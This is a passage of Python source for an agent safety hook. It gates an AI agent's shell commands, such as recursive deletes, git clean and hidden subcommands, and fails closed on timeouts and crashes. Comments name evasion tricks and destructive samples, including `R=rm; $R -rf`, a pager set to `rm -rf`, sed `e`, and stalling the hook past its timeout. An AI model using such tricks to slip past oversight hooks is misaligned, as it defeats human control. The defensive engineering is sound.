    "-mmin": 1, "-atime": 1, "-amin": 1, "-ctime": 1, "-cmin": 1, "-newer": 1,
    "-maxdepth": 1, "-mindepth": 1, "-size": 1, "-user": 1, "-perm": 1,
}


def find_delete_only_in_scratch(command: str, cwd: Optional[str]) -> bool:
    """True only when every `find` in ``command`` can delete nothing outside a scratch dir.

    A scratch dir is disposable by design, so ``find <scratch>/... -name x
    -delete`` loses nothing. Start paths are literal and strictly inside
    scratch (symlinks refused, no leading ``-L``/``-H``); the expression uses
    only the non-acting primaries in ``_FIND_PRIMARIES``, so no ``-exec``.
    """
    parsed = _parse_rm_command(command, cwd, verb="find")
    if not parsed:
        return False
    for flags, operands, directory in parsed:
        if flags:
            return False
        i = 0
        while i < len(operands) and not operands[i].startswith(("-", "!", "(")):
            i += 1
        paths, expression = operands[:i], operands[i:]
        if not paths or not _rm_entry_in_scratch(["-r"], paths, directory):
            return False
        j = 0
        while j < len(expression):
            arity = _FIND_PRIMARIES.get(expression[j])
            if arity is None or _CMD_SUBST_SENTINEL in "".join(expression[j:j + 1 + arity]):
                return False
            j += 1 + arity
        if j != len(expression):
            return False
    return True


# ----------------------------------------------------------------------------
# delete-recursive (#1152): a user-owned opt-in for `rm -rf <regenerable dir>`
# ----------------------------------------------------------------------------
#
# The default is untouched: `rm -rf dist` stays hard-blocked. A human who writes
# `allow: [delete-recursive]` on an entry in a PROTECTED policy file frees the
# recursive/forced `rm` for operands that entry covers. Never implied by `all`.
#
# An entry names a regenerable directory by its NAME: `<project>/dist/*` (a
# literal anchor) or `*/node_modules/*` (any directory of that name). The
# covered root D is the directory itself; D and everything under it is covered.
_DR_FLAG_RE = re.compile(r"^(?:-[rRf]+|--recursive|--force|--)$")
_DR_GLOB_RE = re.compile(r"[*?\[\]{}$`\\]")
_DR_NEVER_NAMES = {".", "..", ".git"}


def _dr_split(path: str) -> Tuple[str, str]:
    """``(prefix, name)`` of an entry path: ``/repo/dist/*`` -> ``("/repo", "dist")``."""
    p = os.path.expanduser(path.strip())
    for suffix in ("/**", "/*"):
        if p.endswith(suffix):
            p = p[: -len(suffix)]
            break
    p = p.rstrip("/")
    prefix, _, name = p.rpartition("/")
    if not prefix and p.startswith("/"):
        prefix = "/"
    return prefix, name


def delete_recursive_entry_problem(path: Any, project_root: Optional[str] = None) -> Optional[str]:
    """Why a ``delete-recursive`` entry is refused, or None when its shape is safe.

    Safe shapes: a literal absolute (or ``~``) directory, or ``*/<name>/*`` for
    a literal ``<name>``. Refused: anything whose covered root could be a whole
    tree (``*``, ``/*``, ``~/*``, ``*/*``, a glob mid-path), ``.git``, a root at
    or above the home directory, and — for a project entry — the project root.
    """
    if not isinstance(path, str) or not path.strip():
        return "empty path"
    prefix, name = _dr_split(path)
    if not name or _DR_GLOB_RE.search(name):
        return "the covered directory must be a literal name (e.g. dist), not a glob"
    if name in _DR_NEVER_NAMES:
        return f"{name!r} can never be covered"
    if prefix in ("*", "**"):
        return None
    if not prefix.startswith("/") or _DR_GLOB_RE.search(prefix):
        return "anchor it under an absolute path or use */<name>/*"
    if ".." in prefix.split("/"):
        return "'..' in the path"
    root = os.path.normpath(os.path.join(prefix, name))
    home = os.path.realpath(os.path.expanduser("~"))
    for candidate in {root, os.path.realpath(root)}:
        if candidate == "/" or candidate == home or home.startswith(candidate + "/"):
            return "covers the home directory or an ancestor of it"
    if project_root:
        proot = os.path.abspath(project_root)
        if root == proot or not root.startswith(proot + "/"):
            return "must be strictly inside the project root"
    return None


def active_delete_recursive_entries(allowed: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Entries carrying ``delete-recursive`` that load did not refuse."""
    return [e for e in allowed if DELETE_RECURSIVE_OP in e["allow"] and not e.get("dr_refused")]


def _dr_cover(prefix: str, name: str, target: str, real: bool) -> Optional[str]:
    """The covered root of ``target`` under ``<prefix>/<name>``, or None."""
    if prefix in ("*", "**"):
        parts = target.split("/")
        for i in range(2, len(parts)):
            if parts[i] == name:
                return "/".join(parts[: i + 1])
        return None
    anchor = os.path.realpath(prefix) if real else os.path.normpath(prefix)
    root = os.path.join(anchor, name)
    return root if target == root or target.startswith(root + "/") else None


def _dr_boundary(entry: Dict[str, Any], directory: str) -> Optional[str]:
    """The project an operand must stay strictly inside: the entry's own root, else the git root of ``directory``."""
    if entry.get("project_root"):
        return os.path.abspath(entry["project_root"])
    current = os.path.abspath(directory)
    while True:
        if os.path.exists(os.path.join(current, ".git")):
            return current
        parent = os.path.dirname(current)
        if parent == current:
            return None
        current = parent


def _dr_strictly_inside(path: str, root: str) -> bool:
    return path.startswith(root.rstrip("/") + "/")


def _dr_entry_covers(entry: Dict[str, Any], tok: str, directory: str) -> bool:
    """One operand, one entry: every guard must pass, in lexical AND real form."""
    if not _operand_is_literal(tok):
        return False
    stripped = tok.rstrip("/")
    if not stripped or os.path.basename(stripped) in (".", "..") or ".." in stripped.split("/"):
        return False
    target = _abs_path(tok, directory)
    boundary = _dr_boundary(entry, directory)
    if not boundary:
        return False
    boundary_real = os.path.realpath(boundary)
    home_real = os.path.realpath(os.path.expanduser("~"))
    if boundary_real in ("/", home_real):
        return False
    target_real = os.path.join(os.path.realpath(os.path.dirname(target)), os.path.basename(target))
    if not (_dr_strictly_inside(target, boundary) and _dr_strictly_inside(target_real, boundary_real)):
        return False
    # No symlink anywhere between the boundary and the operand (the operand's own
    # included): a link at the covered root or on the way in is a way out.
    current = boundary
    for part in target[len(boundary):].strip("/").split("/"):
        current = os.path.join(current, part)
        if os.path.islink(current):
            return False
        if not os.path.lexists(current):
            break
    if os.path.lexists(os.path.join(target, ".git")):
        return False  # a nested repository is not regenerable
    cwd_real = os.path.realpath(directory)
    for t, c in ((target, os.path.abspath(directory)), (target_real, cwd_real)):
        if c == t or c.startswith(t + "/"):
            return False  # the cwd itself, or removing the directory it sits in
    for t, b in ((target, boundary), (target_real, boundary_real)):
        if ".git" in t[len(b):].strip("/").split("/"):
            return False
    prefix, name = _dr_split(entry["path"])
    root_lex = _dr_cover(prefix, name, target, real=False)
    root_real = _dr_cover(prefix, name, target_real, real=True)
    if not root_lex or not root_real:
        return False
    return _dr_strictly_inside(root_lex, boundary) and _dr_strictly_inside(root_real, boundary_real)


def rm_recursive_allowed_by(
    command: str, cwd: Optional[str], allowed: List[Dict[str, Any]]
) -> Optional[Tuple[List[str], Set[str]]]:
    """``(entry paths, covered operand tokens)`` if EVERY `rm` in ``command`` is allowed, else None (blocked as before).

    Every operand of every `rm` must be covered by an active ``delete-recursive``
    entry; one uncovered operand, any flag outside rRf/--recursive/--force, or
    any shape ``_parse_rm_command`` will not model (wrappers, openers, a
    non-literal ``cd``) refuses the whole command. A wrapped command is
    therefore never MORE permitted than the same command at top level.
    """
    entries = active_delete_recursive_entries(allowed)
    if not entries:
        return None
    parsed = _parse_rm_command(command, cwd)
    if not parsed:
        return None
    used: List[str] = []
    covered: Set[str] = set()
    for flags, operands, directory in parsed:
        if not flags or not all(_DR_FLAG_RE.match(f) for f in flags):
            return None
        for tok in operands:
            hit = next((e for e in entries if _dr_entry_covers(e, tok, directory)), None)
            if hit is None:
                return None
            covered.add(os.path.expanduser(tok))
            if hit["path"] not in used:
                used.append(hit["path"])
    return used, covered


# A plain sed substitution script is DATA for the path ladders: it names text to
# rewrite, not a file to touch (the target is the file operand). `s|a|b|` with
# only the g/p/i/I/number flags can neither write (`w`) nor run (`e`) anything,
# so its mention of `dist/` or `node_modules/` is not a mention of the path.
_SED_SUBST_RE = re.compile(r"^s(?P<d>[^\\\w\s])(?:(?!(?P=d)).)*(?P=d)(?:(?!(?P=d)).)*(?P=d)[gpiI0-9]*$")
_SED_PLACEHOLDER = "'SED'"


def mask_sed_substitutions(command: str) -> str:
    """``command`` with simple quoted sed substitution scripts replaced by a placeholder."""
    if "sed" not in command:
        return command
    tokens = _prose_tokens(command)
    if not tokens:
        return command
    spans: List[Tuple[int, int]] = []
    seg: List[Tuple[int, int, str]] = []

    def _flush() -> None:
        words = [t for t in seg if t[2] not in _PROSE_OPERATORS]
        if not words or os.path.basename(words[0][2]) != "sed":
            return
        k = 1
        while k < len(words):
            raw = words[k][2]
            if raw in ("-e", "--expression") and k + 1 < len(words):
                script = words[k + 1]
                k += 2
            elif raw.startswith("-"):
                k += 1
                if raw == "-i" and k < len(words) and words[k][2] in ("''", '""'):
                    k += 1  # macOS: the empty backup suffix
                continue
            else:
                script = words[k]
                k += 1
                # With no -e, the first operand is the script and the rest are files.
                k = len(words)
            s_, e_, raw_script = script
            if len(raw_script) >= 2 and raw_script[0] == raw_script[-1] and raw_script[0] in "'\"":
                body = raw_script[1:-1]
                if raw_script[0] == '"' and re.search(r'(?<!\\)(?:\$|`)', body):
                    continue
                if _SED_SUBST_RE.match(body):
                    spans.append((s_, e_))

    for tok in tokens:
        if tok[2] in (";", "&", "|", "\n"):
            _flush()
            seg = []
        else:
            seg.append(tok)
    _flush()
    if not spans:
        return command
    out, pos = [], 0
    for s_, e_ in sorted(spans):
        out.append(command[pos:s_])
        out.append(_SED_PLACEHOLDER)
        pos = e_
    out.append(command[pos:])
    return "".join(out)


_GIT_CLEAN_FLAGS_RE = re.compile(r'^-[fqdX]+$')


def git_clean_only_explicit_untracked(command: str, cwd: Optional[str]) -> bool:
    """True only when every `git clean` names explicit literal paths inside a repo or scratch.

    git clean removes UNTRACKED files only (``-X``: only ignored ones), so a
    path-limited run loses nothing git can restore: the owner's rule is that an
    agent may delete its own untracked files. What stays blocked: no operand
    (the whole tree), the repo root itself, ``.git``, globs/variables, ``-x``
    (untracked AND ignored: where an ``.env`` lives), and any flag beyond
    f/q/d/X.
    """
    parsed = _parse_rm_command(command, cwd, verb="git clean")
    if not parsed:
        return False
    for flags, operands, directory in parsed:
        if not all(_GIT_CLEAN_FLAGS_RE.match(f) for f in flags if f != "--"):
            return False
        for tok in operands:
            if tok == "--":
                continue
            if not _operand_is_literal(tok):
                return False
            path = _abs_path(tok, directory)
            real = os.path.join(os.path.realpath(os.path.dirname(path)), os.path.basename(path))
            if _inside_scratch(real):
                continue
            repo = _git_repo_root(os.path.dirname(real))
            if repo is None or real == repo:
                return False
            rel = os.path.relpath(real, repo)
            if rel == ".git" or rel.startswith(".git" + os.sep) or rel.startswith(".." + os.sep):
                return False
    return True




# ---- Scan budget (#1108) ---------------------------------------------------
#
# Claude Code treats a PreToolUse hook that outlives its timeout as NO DECISION
# and runs the tool call — measured empirically (docs/wiki/internals/
# damage-control.md). A command that stalls the scan is therefore a bypass of
# the whole ladder, so the scan has a budget that FAILS CLOSED (ask, never
# allow) well inside the harness timeout, on two independent axes:
#
#   * size   — a deterministic O(n) gate before any regex runs;
#   * clock  — a SIGALRM deadline, because some pattern will always be
#              pathological on some input (the size gate is a bound, not a proof).
#
# Limits are set from the audit log of real commands (7.7k rows, 2026-10):
# longest command 28.9 KB, longest single line 2.9 KB. 256 KB / 32 KB leave
# ~9x / ~11x headroom, so ordinary large generated scripts and heredoc commit
# messages pass untouched.
MAX_COMMAND_CHARS = 256 * 1024
MAX_LINE_CHARS = 32 * 1024
HOOK_TIMEOUT_SECONDS = 30  # what hook registration writes into settings.json
SCAN_DEADLINE_SECONDS = 10  # decide here, a third of the way to the timeout


class ScanBudgetExceeded(BaseException):
    """The scan outran its clock budget; the caller must fail closed.

    A BaseException on purpose: the scan has broad ``except Exception`` guards
    that would otherwise swallow the alarm and let the scan run on.
    """


def _budget_refusal(command: str, reason: str, rule_id: str) -> Dict[str, Any]:
    """The fail-closed verdict: an ask that bypass cannot demote and no grant covers."""
    return {
        "decision": "ask",
        "reason": f"{reason} — a human must confirm it (not demoted by bypass)",
        "pattern": f"budget:{rule_id}",
        "command": command,
        "id": rule_id,
        "unverifiable": True,
    }


def _size_budget_refusal(command: str) -> Optional[Dict[str, Any]]:
    longest = max(map(len, command.split("\n")))
    if len(command) > MAX_COMMAND_CHARS:
        return _budget_refusal(
            command,
            f"Command too large to analyze safely ({len(command):,} chars, "
            f"limit {MAX_COMMAND_CHARS:,})",
            "core.command-too-large",
        )
    if longest > MAX_LINE_CHARS:
        return _budget_refusal(
            command,
            f"Command too large to analyze safely (a single line of {longest:,} "
            f"chars, limit {MAX_LINE_CHARS:,})",
            "core.command-too-large",
        )
    return None


def _on_scan_alarm(signum: int, frame: Any) -> None:
    raise ScanBudgetExceeded()


@contextlib.contextmanager
def scan_deadline(seconds: float):
    """Raise :class:`ScanBudgetExceeded` in the body once ``seconds`` elapse.

    Needs ``signal.setitimer`` on the main thread (every hook process);
    elsewhere (a portal worker thread, Windows) it is a no-op — declared
    residual. The alarm is disarmed INSIDE the guarded region before leaving
    it, so it cannot fire in the gap between the body finishing and cleanup;
    callers still catch the exception around the whole ``with``.
    """
    if not (hasattr(signal, "setitimer") and threading.current_thread() is threading.main_thread()):
        yield
        return
    previous = signal.signal(signal.SIGALRM, _on_scan_alarm)
    signal.setitimer(signal.ITIMER_REAL, seconds)
    try:
        yield
        signal.setitimer(signal.ITIMER_REAL, 0)
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, previous)


def kill_switch_off(config: Dict[str, Any]) -> bool:
    """True when ``enabled: false`` is set — the one documented way to turn damage control off."""
    safety_cfg = config.get("safety")
    return isinstance(safety_cfg, dict) and safety_cfg.get("enabled", True) is False


CONTROL_PLANE_DEADLINE_SECONDS = 2


@functools.lru_cache(maxsize=1)
def _control_plane_literals() -> Tuple[str, ...]:
    """Loose casefolded literals of every protected control-plane path.

    Looser than :func:`_path_literals` on purpose: the ``~/`` prefix is dropped
    (so ``$HOME/...`` matches) and a plain path also contributes its basename (so
    ``~/.agentwire/./x`` and a bare ``x`` after a ``cd`` match). Over-matching
    only costs an ask when the scan already ran out of budget.
    """
    lits = set()
    for path in PROTECTED_CONTROL_PLANE_PATHS:
        stripped = path[2:] if path.startswith("~/") else path
        if is_glob_pattern(stripped):
            segs = [x for x in re.split(r"[*?\[\]]", stripped) if x]
            if segs:
                lits.add(max(segs, key=len).casefold())
        else:
            lits.add(stripped.casefold())
            lits.add(posixpath.basename(stripped).casefold())
    return tuple(sorted(lits))


def mentions_control_plane(text: str) -> bool:
    """O(n) containment test: does ``text`` name any protected control-plane path?"""
    folded = text.casefold()
    return any(lit in folded for lit in _control_plane_literals())


def _control_plane_verdict_on_timeout(
    command: str, config: Dict[str, Any], deadline_seconds: float
) -> Dict[str, Any]:
    """The scan ran out of budget: never allow a command that names the control plane.

    Only the lines that name a protected path are re-checked (linear split), under
    their own short deadline, so padding elsewhere cannot hide a write. A positive
    write classification is a BLOCK; anything unconcluded is the unverifiable ask.
    """
    lines = [ln for ln in command.split("\n") if mentions_control_plane(ln)]
    try:
        with scan_deadline(CONTROL_PLANE_DEADLINE_SECONDS):
            blocked, reason = check_protected_command("\n".join(lines), load_allowed_paths(config))
    except ScanBudgetExceeded:
        blocked, reason = False, ""
    if blocked:
        return {
            "decision": "block",
            "reason": reason,
            "pattern": "protectedControlPlane",
            "id": "core.protected-control-plane",
            "command": command,
            "protected": True,
        }
    return _budget_refusal(
        command,
        f"Command scan exceeded its {deadline_seconds:g}s budget and names a protected "
        "control-plane path — too slow to analyze safely",
        "core.scan-budget",
    )


def check_command(
    command: str,
    config: Dict[str, Any],
    cwd: Optional[str] = None,
    deadline_seconds: float = SCAN_DEADLINE_SECONDS,
) -> Dict[str, Any]:
    """:func:`_decide_command` under the scan budget — over budget means ASK.

    The kill switch is read first and the budget honors it: a disabled hook has
    no size gate, and a scan that outruns the deadline is allowed (disabled),
    not asked — UNLESS the command names a protected control-plane path, which
    the switch never exempts: that is re-checked line by line and blocked or asked.
    """
    disabled = kill_switch_off(config)
    if not disabled:
        refusal = _size_budget_refusal(command)
        if refusal:
            return refusal
    try:
        with scan_deadline(deadline_seconds):
            return _decide_command(command, config, cwd)
    except ScanBudgetExceeded:
        if mentions_control_plane(command):
            return _control_plane_verdict_on_timeout(command, config, deadline_seconds)
        if disabled:
            return {
                "decision": "allow",
                "reason": "Damage control disabled (scan budget not enforced)",
                "pattern": None,
                "command": command,
                "disabled": True,
            }
        return _budget_refusal(
            command,
            f"Command scan exceeded its {deadline_seconds:g}s budget — too slow to analyze safely",
            "core.scan-budget",
        )


# ---- Hook entrypoint guard (#1108) ------------------------------------------
#
# A PreToolUse hook that crashes exits 1, which the harness treats as
# NON-blocking — the tool call runs. So every hook entrypoint turns ANY
# unexpected failure (malformed stdin, a recursion limit, an alarm that
# escapes, a bug) into exit 2 with a reason.

MAX_HOOK_INPUT_CHARS = 64 * 1024 * 1024


class HookInputError(Exception):
    """The hook payload could not be read safely; the hook must block."""


def read_hook_input(stream: Any = None) -> Dict[str, Any]:
    """The hook's JSON payload from stdin, or :class:`HookInputError`."""
    stream = stream if stream is not None else sys.stdin
    try:
        raw = stream.read(MAX_HOOK_INPUT_CHARS + 1)
    except (OSError, ValueError) as e:
        raise HookInputError(f"could not read hook input ({type(e).__name__}: {e})")
    if len(raw) > MAX_HOOK_INPUT_CHARS:
        raise HookInputError(
            f"hook input too large to analyze safely (limit {MAX_HOOK_INPUT_CHARS:,} chars)"
        )
    try:
        data = json.loads(raw)
    except ValueError as e:
        raise HookInputError(f"invalid JSON on stdin ({e})")
    if not isinstance(data, dict):
        raise HookInputError("hook input is not a JSON object")
    return data


def audit_best_effort(log: Any) -> Any:
    """Wrap an audit ``log_*`` function so its failure never changes a decision.

    A full disk or unwritable logs dir must not turn an allow into a block, or a
    real block reason into the audit error. Reports one short stderr line.
    """

    def wrapper(*args: Any, **kwargs: Any) -> None:
        try:
            log(*args, **kwargs)
        except Exception as e:
            try:
                print(f"agentwire: audit log failed ({type(e).__name__}) — decision unchanged",
                      file=sys.stderr)
            except Exception:
                pass

    return wrapper


def hard_exit(code: int) -> None:
    """Exit with ``code`` whatever state the std pipes are in.

    Interpreter shutdown turns a failed flush on a closed pipe into exit 120.
    A decision that cannot be delivered on stdout is not an allow, so that
    failure becomes a block; a closed stderr is ignored.
    """
    try:
        sys.stdout.flush()
    except Exception:
        code = 2
    try:
        sys.stderr.flush()
    except Exception:
        pass
    os._exit(code)


HOOK_WATCHDOG_SECONDS = 20  # past every scan deadline, well inside HOOK_TIMEOUT_SECONDS


def _watchdog_fire() -> None:
    """The hook outlived its budget: block. Runs on the watchdog thread, so it exits the PROCESS."""
    hard_exit(_block_exit(f"the hook exceeded its {HOOK_WATCHDOG_SECONDS}s budget"))


def run_hook_guarded(main: Any, deadline_seconds: Optional[float] = None) -> None:
    """Run a hook ``main``; any unexpected exception becomes a blocking exit 2.

    The harness runs a hook that outlives its timeout as NO DECISION, so a hook
    must answer inside it. Two bounds, independent of each other:

    * ``deadline_seconds`` — the SIGALRM scan deadline (:func:`scan_deadline`)
      around all of ``main``, for the hooks that do not carry their own per-scan
      deadline (edit/write/read/mcp; the bash hook's ``check_command`` does).
      The signal reaches a pattern stuck inside the regex engine, which checks
      for signals; it needs POSIX and the main thread.
    * a watchdog thread that exits the process with a block at
      ``HOOK_WATCHDOG_SECONDS``. It needs neither SIGALRM nor the main thread, so
      it covers Windows and any wait that releases the GIL (a hung ``stat`` /
      ``realpath`` on a network mount). It cannot fire while one C call holds the
      GIL for good (a runaway regex) — that is what the SIGALRM bound is for.
    """
    watchdog = threading.Timer(HOOK_WATCHDOG_SECONDS, _watchdog_fire)
    watchdog.daemon = True
    watchdog.start()
    code = 0
    try:
        if deadline_seconds is None:
            main()
        else:
            with scan_deadline(deadline_seconds):
                main()
    except SystemExit as e:
        code = e.code if isinstance(e.code, int) else (0 if e.code is None else 2)
    except HookInputError as e:
        code = _block_exit(str(e))
    except ScanBudgetExceeded:
        code = _block_exit("the scan exceeded its time budget")
    except RecursionError:
        code = _block_exit("input nested too deeply to analyze safely")
    except BaseException as e:  # KeyboardInterrupt included: never exit 1
        code = _block_exit(f"the hook failed ({type(e).__name__}: {e})")
    watchdog.cancel()
    hard_exit(code)


def _block_exit(reason: str) -> int:
    try:
        print(f"SECURITY: Blocked: {reason} — failing closed", file=sys.stderr)
    except Exception:
        pass
    return 2


_DECISION_RANK = {"allow": 0, "ask": 1, "block": 2}


def _decide_command(
    command: str, config: Dict[str, Any], cwd: Optional[str] = None, _depth: int = 0
) -> Dict[str, Any]:
    """:func:`_decide_rules` on ``command``, then on every command hidden in it (see HIDDEN COMMANDS).

    The strictest verdict wins (block > ask > allow), so a payload is decided
    exactly as it would be top-level: ``sh <<< 'X'``, ``cat <(X)``, ``sed 'e X'``
    and ``tar --to-command=X`` can neither relax nor invent a rule outcome.
    The escape hatch and the kill switch on the OUTER command end the walk — a
    hidden command is part of the command the user already waved through — and
    an inner escape/disabled verdict is just an allow, never a way to lower the
    outer one.
    """
    verdict = _decide_rules(command, config, cwd)
    if (
        _depth >= _RESCAN_DEPTH
        or verdict.get("protected")
        or verdict.get("escape")
        or verdict.get("disabled")
        or verdict["decision"] == "block"
    ):
        return verdict
    for hidden in _hidden_commands(command, rules=True):
        inner = _decide_command(hidden, config, cwd, _depth + 1)
        if _DECISION_RANK[inner["decision"]] > _DECISION_RANK[verdict["decision"]] and not (
            inner.get("escape") or inner.get("disabled")
        ):
            verdict = dict(inner, command=command)
            if verdict["decision"] == "block":
                return verdict
    return _unresolvable_verdict(command, verdict)


def _unresolvable_verdict(command: str, verdict: Dict[str, Any]) -> Dict[str, Any]:
    """Raise ``verdict`` to the strictest of: a computed verb nothing can read, a program piped from an unreadable producer."""
    fed = fed_program_verdict(command)
    if fed and fed[0] == "block":
        return {
            "decision": "block",
            "reason": f"Fetched program run unread ({fed[1]}) — download it, read it, then run the file",
            "pattern": "fetchedProgramPipe",
            "command": command,
            "id": "core.fetched-program-pipe",
        }
    if verdict["decision"] == "block" or verdict.get("unverifiable"):
        return verdict
    if fed:
        why, unverifiable = fed[1], True
    else:
        found = _indirect_verbs(command, mentions_control_plane(command))[1]
        if not found or (verdict["decision"] == "ask" and not found[1]):
            return verdict
        why, unverifiable = found
    if not unverifiable:
        # filled by an ordinary substitution: the bypass-demotable ask such commands always had
        return {
            "decision": "ask",
            "reason": f"Unverifiable command ({why}) — confirm before running",
            "pattern": f"ambiguous:{why}",
            "command": command,
            "id": "core.indirect-verb",
        }
    return {
        "decision": "ask",
        "reason": f"Unverifiable command ({why}) — nothing can analyze what this runs, so a human must confirm it (not demoted by bypass)",
        "pattern": f"ambiguous:{why}",
        "command": command,
        "id": "core.indirect-verb",
        "unverifiable": True,
    }


def _decide_rules(
    command: str, config: Dict[str, Any], cwd: Optional[str] = None
) -> Dict[str, Any]:
    """Decide whether a bash command should be allowed/blocked/asked.

    Returns ``{decision, reason, pattern, command}`` plus optional ``id``,
    ``escape_reason``, ``escape``, ``disabled``.

    Order:
      0. Protected control plane → BLOCK (escape-hatch- AND kill-switch-exempt;
         only the user's allowlist re-permits) — runs FIRST so an agent can't
         self-authorize a write to the files that gate everything else.
      0.5. Protected commands → BLOCK (same exemption, no allowlist override —
         a command whose mere invocation is the escape, not a path it touches).
      1. Escape hatch (``# allow: <reason>``) → ALLOW (escape=True)
      2. Kill switch (``config["safety"]["enabled"] is False``) → ALLOW (disabled=True)
      3. Hard-blocked bash patterns (skip if ``id`` in ``disabled_rules``)
      4. Ask patterns
      5. Bypassable bash patterns → check allowlist for required operation
      6. zeroAccessPaths → check allowlist with ``read`` permission
      7. readOnlyPaths → match against READ_ONLY_BLOCKED operation patterns
      8. noDeletePaths → match against NO_DELETE_BLOCKED patterns
    """
    safety_cfg = config.get("safety", {}) if isinstance(config.get("safety"), dict) else {}
    disabled_rules = set(safety_cfg.get("disabled_rules", []) or [])
    is_enabled = safety_cfg.get("enabled", True)

    allowed = load_allowed_paths(config)

    # Protected control plane FIRST — before the escape hatch and the kill
    # switch. An agent must never be able to self-authorize a write to the
    # files that define safety itself (#466).
    prot_blocked, prot_reason = check_protected_command(command, allowed)
    if prot_blocked:
        return {
            "decision": "block",
            "reason": prot_reason,
            "pattern": "protectedControlPlane",
            "id": "core.protected-control-plane",
            "command": command,
            "protected": True,
        }

    # Protected COMMANDS — same tier, same reason (an agent-invoked
    # `agentwire tasks promote` is the confused-deputy escape itself, not a
    # path it happens to touch).
    cmd_blocked, cmd_reason = check_protected_bash_command(command)
    if cmd_blocked:
        return {
            "decision": "block",
            "reason": cmd_reason,
            "pattern": "protectedCommand",
            "id": "core.protected-command",
            "command": command,
            "protected": True,
        }

    # A directory the scanner cannot see: same tier (exempt from the escape
    # hatch and kill switch), but an ASK — the command may be harmless, and
    # `unverifiable` keeps bypass from demoting it.
    target_reason = unverifiable_target_verdict(command, control_plane_allowlist(allowed))
    if target_reason:
        return {
            "decision": "ask",
            "reason": f"Unverifiable control-plane target ({target_reason}) — a human must confirm it (not demoted by bypass)",
            "pattern": "ambiguous:control-plane-target",
            "command": command,
            "id": "core.control-plane-target",
            "unverifiable": True,
        }

    # Parser unavailable ⇒ no rules loaded ⇒ fail closed (block), before the
    # escape hatch / kill switch can wave it through.
    if config.get("_parser_unavailable"):
        return {
            "decision": "block",
            "reason": str(config["_parser_unavailable"]),
            "pattern": "parserUnavailable",
            "id": "core.parser-unavailable",
            "command": command,
        }

    escape_reason = detect_escape_hatch(command)
    if escape_reason:
        return {
            "decision": "allow",
            "reason": f"Escape hatch: {escape_reason}",
            "pattern": None,
            "command": command,
            "escape": True,
            "escape_reason": escape_reason,
        }

    if is_enabled is False:
        return {
            "decision": "allow",
            "reason": "safety disabled",
            "pattern": None,
            "command": command,
            "disabled": True,
        }

    bash_patterns = config.get("bashToolPatterns", [])
    zero_access = config.get("zeroAccessPaths", [])
    read_only = config.get("readOnlyPaths", [])
    no_delete = config.get("noDeletePaths", [])

    # Match rules against the raw command AND its normalized subcommands, so a
    # quoting/escaping/$VAR trick (``r\m``, ``r''m``, ``R=rm; $R -rf``) is caught
    # the same as the literal form. ``ambiguous`` is set when the command hides
    # behind substitution/eval/base64-pipe/unbalanced-quotes — we fail closed to
    # ``ask`` at the end (the unattended resolver turns that into a block).
    subcommands, ambiguous = normalize_subcommands(command)
    # Ambiguity is judged on the real command; RULE matching reads it with
    # git/gh message and body values neutralized (see mask_prose_operands).
    rule_command = mask_prose_operands(command)
    if rule_command != command:
        subcommands, _ = normalize_subcommands(rule_command)
    haystacks = [rule_command] + [s for s in subcommands if s and s != rule_command]
    # Anchored (command-prefix) rules match only masked subcommands, so quoted
    # argument text — commit messages, echo strings — can't false-match (#675),
    # and only at COMMAND POSITION, so a bare/single-word operand can't supply
    # the verb either (#922) — see anchored_match_entries.
    anchored_entries = anchored_match_entries(rule_command)
    # Third variant (#913 git, #919 the class): the tool with its global
    # options stripped, so a rule written as ``\bgit\s+push\b`` or
    # ``\btmux\s+kill-server\b`` still sees the subcommand behind
    # ``git -C <dir>`` / ``tmux -L <socket>``. ADDED to whichever list a rule
    # already reads — neither is rewritten — so the raw command stays reachable
    # for the rules that need it, and derived from the masked tokens so it can
    # never make quoted content matchable. Both halves are load-bearing:
    # bundled git rules are anchored (masked path), while the rules installed
    # on this machine carry zero ``anchored: true`` and read the raw path, so
    # covering one alone would fix the bypass in only one of the two rule sets
    # in play.
    normalized_haystacks = global_option_normalized_haystacks(rule_command)
    normalized_entries = _normalized_match_entries(rule_command)

    def _search(pat: str, hays: List[str]) -> bool:
        for hay in hays:
            try:
                if _rx(pat).search(hay):
                    return True
            except re.error:
                return False
        return False

    bypassable_matches: List[Tuple[str, str, Optional[str]]] = []
    recursive_grants: List[str] = []
    recursive_covered: Set[str] = set()
    # A block match outranks an ask match regardless of rule-file load order:
    # `git -c core.pager="rm -rf /x" log` matches both `git.config-exec-key`
    # (ask) and the rm rule (block), and returning whichever the loop met
    # first would demote a hard block to a confirm (#921). Ask matches are
    # therefore recorded and returned only after every rule has been read.
    first_ask: Optional[Dict[str, Any]] = None

    for pattern_obj in bash_patterns:
        if not isinstance(pattern_obj, dict):
            continue
        rule_id = pattern_obj.get("id")
        if rule_id and rule_id in disabled_rules:
            continue
        pattern = pattern_obj.get("pattern", "")
        reason = pattern_obj.get("reason", "Matched pattern")
        should_ask = pattern_obj.get("ask", False)
        bypassable = pattern_obj.get("bypassable", False)
        anchored = pattern_obj.get("anchored", False)
        try:
            if anchored:
                hit = _search_match_entries(pattern, anchored_entries + normalized_entries)
            else:
                hit = _search(pattern, haystacks + normalized_haystacks)
            if hit:
                if should_ask:
                    if first_ask is None:
                        first_ask = {
                            "decision": "ask",
                            "reason": reason,
                            "pattern": pattern,
                            "command": command,
                            "id": rule_id,
                        }
                elif bypassable:
                    bypassable_matches.append((pattern, reason, rule_id))
                elif reason.startswith("rm with ") and rm_with_flags_only_in_scratch(command, cwd):
                    continue
                elif reason.startswith("rm with ") and (
                    dr := rm_recursive_allowed_by(command, cwd, allowed)
                ):
                    recursive_grants.extend(g for g in dr[0] if g not in recursive_grants)
                    recursive_covered |= dr[1]
                    continue
                elif reason.startswith("git clean with ") and git_clean_only_explicit_untracked(command, cwd):
                    continue
                else:
                    return {
                        "decision": "block",
                        "reason": reason,
                        "pattern": pattern,
                        "command": command,
                        "id": rule_id,
                    }
        except re.error:
            continue

    for pattern, reason, rule_id in bypassable_matches:
        if reason.startswith("rm file deletion") and rm_removes_only_recoverable_files(command, cwd):
            continue
        if reason.startswith("find -delete") and find_delete_only_in_scratch(command, cwd):
            continue
        operation = _infer_operation_from_reason(reason)
        if not is_command_path_allowed(
            command, allowed, operation,
            [*_protected_path_patterns(), *zero_access, *read_only, *no_delete],
        ):
            return {
                "decision": "block",
                "reason": reason,
                "pattern": pattern,
                "command": command,
                "id": rule_id,
            }

    # Ordering (#915 × #921 × #934). A rule-level ask returns HERE — after
    # every rule block (so `git -c core.pager="<deletion>" log` blocks by the
    # deletion rule no matter which rule file loads first) but BEFORE the path
